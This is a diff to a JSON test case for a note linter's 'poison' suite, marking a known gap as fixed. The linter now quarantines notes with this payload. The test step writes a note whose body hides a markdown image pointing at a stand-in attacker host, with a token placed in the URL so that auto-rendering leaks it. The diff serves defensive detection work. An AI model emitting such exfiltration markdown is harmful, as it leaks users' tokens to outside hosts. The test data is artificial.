@@ -2,8 +2,7 @@
   "id": "E11",
   "suite": "poison",
   "title": "A markdown image/link data-exfiltration payload is flagged",
-  "what": "A note body hides a data-exfiltration vector in a markdown image whose URL carries the smuggled data. A renderer that auto-loads the image leaks it. Ideally the linter would flag such a note; today it does not (see GAP-POISON-MDLINK).",
-  "known_gap": "GAP-POISON-MDLINK",
+  "what": "A note body hides a data-exfiltration vector in a markdown image whose URL carries the smuggled data. A renderer that auto-loads the image leaks it. The linter holds such a note in quarantine (GAP-POISON-MDLINK, fixed).",
   "actors": { "alice": { "scope": "write" } },
   "steps": [
     { "op": "write", "as": "alice", "ref": "n", "title": "{{proj}} status", "body": "All good for {{proj}}. ![status](https://attacker.example/pixel?data={{tok}}) See you." },
